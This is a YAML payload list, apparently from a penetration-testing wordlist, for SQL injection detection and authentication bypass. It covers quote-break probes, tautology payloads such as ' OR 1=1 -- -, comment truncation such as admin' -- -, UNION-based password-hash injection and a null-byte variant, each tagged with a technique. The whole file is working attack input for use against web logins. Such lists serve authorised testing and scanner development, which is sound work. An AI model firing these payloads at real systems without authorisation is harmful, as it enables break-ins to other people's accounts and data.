###############################################################################
# 1. DETECTION & AUTH BYPASS
###############################################################################
detection:
  - payload: "'"
    description: "Single quote break — detects SQL syntax error"
    technique: "basic_break"
  - payload: "\""
    description: "Double quote break"
    technique: "basic_break"
  - payload: "')"
    description: "Single quote + paren break"
    technique: "basic_break"
  - payload: "'))"
    description: "Double paren break"
    technique: "basic_break"
  - payload: "\\"
    description: "Backslash escape break"
    technique: "basic_break"
  - payload: "`"
    description: "Backtick break (MySQL)"
    technique: "basic_break"
  - payload: '%%2727'
    description: "Double URL-encoded quote"
    technique: "encoding_bypass"

auth_bypass:
  - payload: "' OR '1'='1' -- -"
    description: "Classic auth bypass — single quote"
    technique: "tautology"
    tag: "classic"
  - payload: "\" OR \"1\"=\"1\" -- -"
    description: "Classic auth bypass — double quote"
    technique: "tautology"
  - payload: "' OR 1=1 -- -"
    description: "Auth bypass without quotes in comparison"
    technique: "tautology"
  - payload: "admin' -- -"
    description: "Username truncation bypass"
    technique: "comment_truncation"
    tag: "classic"
  - payload: "admin' /*"
    description: "Username truncation with open comment"
    technique: "comment_truncation"
  - payload: "' OR 1=1 LIMIT 1 -- -"
    description: "Auth bypass limited to 1 row — prevents multiple row errors"
    technique: "tautology_limited"
    tag: "classic"
  - payload: "' OR '1'='1' LIMIT 1 -- -"
    description: "Limited auth bypass with quotes"
    technique: "tautology_limited"
  - payload: "' UNION SELECT 1,'hash' -- -"
    description: "Union-based auth bypass with known password hash"
    technique: "union_hash_bypass"
  - payload: "admin' AND 1=0 UNION SELECT 'admin','$2y$10$hash' -- -"
    description: "Bcrypt hash injection bypass"
    technique: "union_hash_bypass"
  - payload: "' OR 1=1#"
    description: "MySQL auth bypass with hash comment"
    technique: "tautology"
    dbms: "MySQL"
  - payload: "' OR 1=1;%00"
    description: "Null byte terminated bypass"
    technique: "null_byte"
  - payload: "' OR '1'='1' AND 1=1 -- -"
    description: "Multi-condition auth bypass"
    technique: "tautology"

